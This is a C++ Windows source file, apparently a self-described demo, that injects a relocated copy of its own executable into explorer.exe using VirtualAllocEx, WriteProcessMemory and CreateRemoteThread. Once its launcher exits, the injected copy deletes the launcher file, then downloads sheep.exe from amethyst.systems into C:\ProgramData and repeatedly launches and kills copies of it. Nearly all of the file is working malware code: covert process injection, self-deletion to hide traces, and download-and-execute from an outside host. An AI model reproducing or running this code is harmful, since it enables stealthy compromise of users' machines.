#include <cstdint>
#include <cstddef>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <cassert>
#include <optional>
#include <vector>
#include <windows.h>
#include <psapi.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#define VA_TO_RVA(base, va) (((std::uintptr_t)va) - ((std::uintptr_t)base))

enum class MonitorState { STATE_MIGRATE, STATE_MONITOR };

MonitorState MAIN_STATE = MonitorState::STATE_MIGRATE;
uint8_t *FRESH_IMAGE = nullptr;

void exit_thread(void) {
   ExitThread(0);
}

PIMAGE_NT_HEADERS64 get_nt_headers(std::uint8_t *base) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
   return (PIMAGE_NT_HEADERS64)&base[dos_header->e_lfanew];
}

VOID WINAPI get_fresh_image(PVOID instance, DWORD reason, PVOID reserved) {
   if (reason != DLL_PROCESS_ATTACH)
      return;

   std::uint8_t *self_u8 = (std::uint8_t *)instance;
   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(self_u8);
   FRESH_IMAGE = (std::uint8_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nt_headers->OptionalHeader.SizeOfImage);
   std::memcpy(FRESH_IMAGE, self_u8, nt_headers->OptionalHeader.SizeOfImage);
}

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:tls_callback")
#pragma const_seg(push)
#pragma const_seg(".CRT$XLAAA")
extern "C" const PIMAGE_TLS_CALLBACK tls_callback = get_fresh_image;
#pragma const_seg(pop)

void relocate_image(std::uint8_t *image, std::uintptr_t from, std::uintptr_t to) {
   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image);
   DWORD reloc_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

   if (reloc_rva == 0)
      return;

   std::uintptr_t base_delta = to - from;
   std::uint8_t *base_reloc = &image[reloc_rva];

   while (((PIMAGE_BASE_RELOCATION)base_reloc)->VirtualAddress != 0) {
      PIMAGE_BASE_RELOCATION base_reloc_block = (PIMAGE_BASE_RELOCATION)base_reloc;
      WORD *entry_table = (WORD *)&base_reloc[sizeof(IMAGE_BASE_RELOCATION)];
      std::size_t entries = (base_reloc_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

      for (std::size_t i=0; i<entries; ++i) {
         DWORD reloc_rva = base_reloc_block->VirtualAddress + (entry_table[i] & 0xFFF);
         std::uintptr_t *reloc_ptr = (std::uintptr_t *)&image[reloc_rva];
               
         if ((entry_table[i] >> 12) == IMAGE_REL_BASED_DIR64)
            *reloc_ptr += base_delta;
      }
            
      base_reloc += base_reloc_block->SizeOfBlock;
   }

   // the loader assigns OptionalHeader.ImageBase after relocation
   nt_headers->OptionalHeader.ImageBase = (ULONGLONG)to;
}

struct SheepConfig {
   std::uintptr_t image_base;
   MonitorState state;
   DWORD launcher_pid;
   char launcher_file[MAX_PATH+1];
   std::size_t max_sheep;
};

SheepConfig *GLOBAL_CONFIG = nullptr;

DWORD WINAPI load_image(SheepConfig *config) {
   GLOBAL_CONFIG = config;
   MAIN_STATE = GLOBAL_CONFIG->state;
   std::uint8_t *base_u8 = (std::uint8_t *)GLOBAL_CONFIG->image_base;
   PIMAGE_NT_HEADERS64 base_nt = get_nt_headers(base_u8);
   
   DWORD import_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

   if (import_rva != 0) {
      PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)&base_u8[import_rva];

      while (import_table->OriginalFirstThunk != 0) {
         HMODULE module = LoadLibraryA((const char *)&base_u8[import_table->Name]);
         std::uintptr_t *original_thunks = (std::uintptr_t *)&base_u8[import_table->OriginalFirstThunk];
         std::uintptr_t *import_addrs = (std::uintptr_t *)&base_u8[import_table->FirstThunk];

         while (*original_thunks != 0) {
            if (*original_thunks & 0x8000000000000000)
               *import_addrs = (std::uintptr_t)GetProcAddress(module, MAKEINTRESOURCE(*original_thunks & 0xFFFF));
            else {
               PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)&base_u8[*original_thunks];
               *import_addrs = (std::uintptr_t)GetProcAddress(module, import_by_name->Name);
            }

            ++import_addrs;
            ++original_thunks;
         }

         ++import_table;
      }
   }

   /* initialize the tls callbacks */
   DWORD tls_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;

   if (tls_rva != 0) {
      PIMAGE_TLS_DIRECTORY64 tls_dir = (PIMAGE_TLS_DIRECTORY64)&base_u8[tls_rva];
      void (**callbacks)(PVOID, DWORD, PVOID) = (void (**)(PVOID, DWORD, PVOID))tls_dir->AddressOfCallBacks;

      while (*callbacks != NULL) {
         (*callbacks)(base_u8, DLL_PROCESS_ATTACH, nullptr);
         ++callbacks;
      }
   }

   return 0;
}

bool download_url(const wchar_t *domain, const wchar_t *url, const char *filename) {
   HINTERNET session = WinHttpOpen(L"Amethyst Labs/1.0",
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                   WINHTTP_NO_PROXY_NAME,
                                   WINHTTP_NO_PROXY_BYPASS,
                                   0);

   if (session == nullptr)
      return false;

   HINTERNET connection = WinHttpConnect(session,
                                         domain,
                                         INTERNET_DEFAULT_HTTPS_PORT,
                                         0);

   if (connection == nullptr)
      return false;

   HINTERNET request = WinHttpOpenRequest(connection,
                                          L"GET",
                                          url,
                                          nullptr,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);

   if (request == nullptr)
      return false;

   bool results = WinHttpSendRequest(request,
                                     WINHTTP_NO_ADDITIONAL_HEADERS,
                                     0,
                                     WINHTTP_NO_REQUEST_DATA,
                                     0,
                                     0,
                                     0);

   if (!results)
      return false;

   results = WinHttpReceiveResponse(request, nullptr);

   if (!results)
      return false;

   std::size_t out_size = 0;
   std::uint32_t chunk = 0;
   std::vector<std::uint8_t> out_buff;
   std::uint32_t downloaded = 0;

   if (!WinHttpQueryDataAvailable(request, (LPDWORD)&chunk))
      return false;

   while (chunk > 0) {
      if (out_size == 0)
         out_buff.resize(chunk, 0);
      else
         out_buff.resize(out_size+chunk, 0);

      std::memset(&out_buff[out_size], 0, chunk);

      if (!WinHttpReadData(request, &out_buff[out_size], chunk, (LPDWORD)&downloaded))
         return false;

      out_size += chunk;

      if (!WinHttpQueryDataAvailable(request, (LPDWORD)&chunk))
         return false;
   }

   HANDLE sheep_handle = CreateFileA(filename,
                                     GENERIC_WRITE,
                                     0,
                                     nullptr,
                                     CREATE_ALWAYS,
                                     FILE_ATTRIBUTE_NORMAL,
                                     nullptr);

   if (sheep_handle == INVALID_HANDLE_VALUE)
      return false;

   DWORD bytes_written;

   if (!WriteFile(sheep_handle, &out_buff[0], out_buff.size(), &bytes_written, nullptr)) {
      CloseHandle(sheep_handle);
      return false;
   }

   CloseHandle(sheep_handle);

   return true;
}

bool spawn_sheep(LPPROCESS_INFORMATION proc_info) {
   STARTUPINFOA startup_info;
   memset(&startup_info, 0, sizeof(STARTUPINFOA));
   startup_info.cb = sizeof(STARTUPINFOA);

   // explorer.exe has the following process attributes:
   // CREATE_DEFAULT_ERROR_MODE | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE | CREATE_SUSPENDED
   
   return (bool)CreateProcessA("C:\\ProgramData\\sheep.exe",
                               "sheep",
                               nullptr,
                               nullptr,
                               FALSE,
                               CREATE_NEW_CONSOLE,
                               nullptr,
                               nullptr,
                               &startup_info,
                               proc_info);
}

bool clear_inactive_sheep(std::vector<PROCESS_INFORMATION> &sheep_pool) {
   bool result = false;
   
   for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
      DWORD exit_code;
      
      if (!GetExitCodeProcess(iter->hProcess, &exit_code) || exit_code == STILL_ACTIVE)
         continue;

      sheep_pool.erase(iter);
      result = true;
   }

   return result;
}

void russian_roulette(std::vector<PROCESS_INFORMATION> &sheep_pool) {
   std::size_t chambers = 6;
   
   for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
      if (chambers == 0)
         chambers = 6;
      
      if ((std::rand() % (chambers--)) != 0)
         continue;

      HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, iter->dwProcessId);

      if (proc == nullptr)
         continue;

      TerminateProcess(proc, 0);
      chambers = 6;
   }
}

int WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR cmdline, int showcmd) {
   switch (MAIN_STATE) {
   case MonitorState::STATE_MIGRATE: {
      /* enum processes and get pid tied to explorer.exe */
      DWORD proc_array_bytes = sizeof(DWORD) * 1024;
      DWORD *proc_array = (DWORD *)std::malloc(proc_array_bytes);
      DWORD proc_array_needed;
      assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));

      if (proc_array_needed > proc_array_bytes) {
         proc_array = (DWORD *)std::realloc(proc_array, proc_array_needed);
         proc_array_bytes = proc_array_needed;
         assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));
      }

      std::size_t pids = proc_array_needed / sizeof(DWORD);
      DWORD found_pid = -1;

      for (std::size_t i=0; i<pids; ++i) {
         HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_array[i]);

         if (proc == NULL)
            continue;

         char filename[MAX_PATH+1];
         std::memset(&filename[0], 0, MAX_PATH+1);
         DWORD filename_size = GetModuleFileNameExA(proc, nullptr, &filename[0], MAX_PATH);

         std::size_t j;
      
         for (j=filename_size; j!=0; --j)
            if (filename[j] == '\\')
               break;

         ++j;

         if (std::strncmp(&filename[j], "explorer.exe", std::strlen("explorer.exe")) == 0) {
            found_pid = proc_array[i];
            break;
         }
      }

      assert(found_pid != -1);

      /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE */
      HANDLE explorer_proc = OpenProcess(PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, found_pid);
      assert(explorer_proc != nullptr);
      
      /* allocate space for our executable */
      std::uint8_t *self_u8 = (std::uint8_t *)GetModuleHandleA(nullptr);
      PIMAGE_NT_HEADERS64 self_nt = get_nt_headers(self_u8);
      std::uintptr_t explorer_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, self_nt->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      assert(explorer_base != 0);
      
      /* copy the executable in memory and relocate it to the allocated base */
      std::uint8_t *copy_u8 = (std::uint8_t *)std::malloc(self_nt->OptionalHeader.SizeOfImage);
      std::memcpy(copy_u8, FRESH_IMAGE, self_nt->OptionalHeader.SizeOfImage);
      relocate_image(copy_u8, (std::uintptr_t)self_u8, explorer_base);
      
      /* write the relocated executable to the process's allocation with WriteProcessMemory */
      SIZE_T bytes_written;
      assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.SizeOfImage, &bytes_written));

      std::uintptr_t config_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, sizeof(SheepConfig), MEM_COMMIT, PAGE_READWRITE);
      assert(config_base != 0);

      SheepConfig explorer_config;
      std::memset(&explorer_config, 0, sizeof(SheepConfig));
      explorer_config.image_base = explorer_base;
      explorer_config.state = MonitorState::STATE_MONITOR;
      explorer_config.launcher_pid = GetCurrentProcessId();
      explorer_config.max_sheep = 10;
      GetModuleFileName(nullptr, &explorer_config.launcher_file[0], MAX_PATH);

      assert(WriteProcessMemory(explorer_proc, (LPVOID)config_base, &explorer_config, sizeof(SheepConfig), &bytes_written));
      
      /* get the rva of the loader and call it with CreateRemoteThread */
      DWORD loader_rva = VA_TO_RVA(self_u8, load_image);
      DWORD loader_id;
      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), (LPVOID)config_base, 0, &loader_id);
      assert(loader_handle != nullptr);
      
      /* wait for the thread to finish */
      WaitForSingleObject(loader_handle, INFINITE);
      
      /* get the rva of the target routine and call it with CreateRemoteThread */
      DWORD main_id;
      HANDLE main_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+self_nt->OptionalHeader.AddressOfEntryPoint), nullptr, 0, &main_id);
      assert(main_handle != nullptr);

      return 0;
   }

   case MonitorState::STATE_MONITOR: {
      atexit(exit_thread);

      DWORD exit_code = STILL_ACTIVE;
      
      do {
         HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GLOBAL_CONFIG->launcher_pid);

         // if it results in a null handle, the process is probably dead
         if (proc == nullptr)
            break;

         GetExitCodeProcess(proc, &exit_code);
         Sleep(1000);
      } while (exit_code == STILL_ACTIVE);

      /* we could get fancy and persist in the registry if we so wanted to right here,
       * but for demo purposes we simply delete the original file */
      while (!DeleteFile(GLOBAL_CONFIG->launcher_file)) {
         DWORD error = GetLastError();

         if (error == ERROR_FILE_NOT_FOUND)
            break;
         
         Sleep(1000);
      }

      std::srand(std::time(0));

      /* let's talk about the sheep monitor! this silly little demo basically does the following:
       * create a vector of sheep processes
       * poll every minute
       * if C:\ProgramData\sheep.exe does not exist, download it from amethyst.systems/sheep.exe
       * if sheep_pool is at the limit, check if any sheep has died and clear them from the list
       * if number of sheep does not meet the limit, spawn a sheep process
       * if the number of sheep is at the limit, one sheep plays Russian Roulette
       * if they lose, they die */

      std::vector<PROCESS_INFORMATION> sheep_pool;

      while (GetFileAttributes("C:\\ProgramData\\sheep.exe") != INVALID_FILE_ATTRIBUTES || download_url(L"amethyst.systems", L"/sheep.exe", "C:\\ProgramData\\sheep.exe")) {
         if (sheep_pool.size() > 0)
            clear_inactive_sheep(sheep_pool);

         if (sheep_pool.size() < GLOBAL_CONFIG->max_sheep) {
            PROCESS_INFORMATION new_sheep;
            
            if (spawn_sheep(&new_sheep))
               sheep_pool.push_back(new_sheep);
         }
         else
            russian_roulette(sheep_pool);

         Sleep(60000);
      }
      
      return 0;
   }
   }

   return 1;
}
